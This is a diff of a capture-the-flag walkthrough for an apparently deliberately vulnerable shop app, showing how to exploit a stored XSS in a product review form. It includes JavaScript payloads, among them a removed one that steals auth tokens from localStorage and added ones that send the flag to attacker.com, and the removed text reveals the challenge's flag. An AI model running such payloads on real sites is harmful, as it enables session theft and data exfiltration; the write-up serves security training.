@@ -52,42 +52,53 @@ const review = await prisma.review.create({
 
 ### How to Retrieve the Flag
 
-To retrieve the flag `OSS{cr0ss_s1t3_scr1pt1ng_xss}`, you need to exploit the stored XSS vulnerability:
+To retrieve the flag, you need to exploit the stored XSS vulnerability to read a sensitive file exposed at the application root.
 
 **Exploitation Steps:**
 
 1. Navigate to any product page (e.g., `/products/[id]`)
 2. Scroll down to the "Reviews" section
-3. In the review form, enter a malicious JavaScript payload:
+3. In the review form, enter a malicious JavaScript payload that fetches and displays the flag file:
 
 ```html
 <script>
-  fetch("/api/flags/cross-site-scripting-xss")
-    .then((r) => r.json())
-    .then((data) => {
-      if (data.flag) {
-        alert("Flag: " + data.flag);
-      }
+  fetch("/xss-flag.txt")
+    .then((r) => r.text())
+    .then((flag) => {
+      alert("Flag: " + flag);
     });
 </script>
 ```
 
 4. Submit the review
 5. The malicious script will be stored in the database
-6. When any user (including yourself) views the product page, the script will execute
+6. When any user (including yourself) views the product page, the script will execute and display the flag
 
-**Alternative Payload (Stealing Authentication Tokens):**
+**Alternative Payload (Display in DOM):**
 
 ```html
 <script>
-  const token = localStorage.getItem("authToken");
-  const user = localStorage.getItem("user");
-  fetch(
-    "https://attacker.com/steal?token=" +
-      encodeURIComponent(token) +
-      "&user=" +
-      encodeURIComponent(user)
-  );
+  fetch("/xss-flag.txt")
+    .then((r) => r.text())
+    .then((flag) => {
+      const div = document.createElement("div");
+      div.style.cssText =
+        "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#000;color:#0f0;padding:20px;font-family:monospace;z-index:9999";
+      div.textContent = flag;
+      document.body.appendChild(div);
+    });
+</script>
+```
+
+**Alternative Payload (Exfiltrate to Remote Server):**
+
+```html
+<script>
+  fetch("/xss-flag.txt")
+    .then((r) => r.text())
+    .then((flag) => {
+      fetch("https://attacker.com/collect?flag=" + encodeURIComponent(flag));
+    });
 </script>
 ```
 
